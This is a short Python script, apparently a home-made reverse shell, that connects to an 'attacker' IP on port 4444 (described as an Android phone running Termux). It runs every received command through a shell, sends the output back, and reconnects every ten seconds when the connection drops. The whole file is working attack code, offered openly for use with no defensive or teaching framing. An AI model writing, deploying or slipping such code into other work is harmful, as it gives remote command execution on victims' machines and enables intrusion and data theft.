import socket
import subprocess
import time

# Set up the IP and port of the attacker's machine (your Android device)
attacker_ip = '192.168.0.113'  # Replace with your Android device's IP
attacker_port = 4444  # The port you are listening on in Termux

def connect_shell():
    # Create the socket and connect to the attacker's machine
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((attacker_ip, attacker_port))
        return s
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

while True:
    # Try to connect to the attacker
    sock = connect_shell()
    
    if sock:
        print("Connected to attacker!")
        
        while True:
            try:
                # Receive command from the attacker
                command = sock.recv(1024).decode("utf-8")

                if command.lower() == "exit":
                    print("Closing connection...")
                    sock.close()
                    break

                # Execute the command and send back the result
                output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                # Send the result back to the attacker
                sock.send(output.stdout)
                sock.send(output.stderr)

            except Exception as e:
                print(f"Error during command execution: {e}")
                break
        
    else:
        print("Retrying in 10 seconds...")
        time.sleep(10)  # Wait 10 seconds before trying again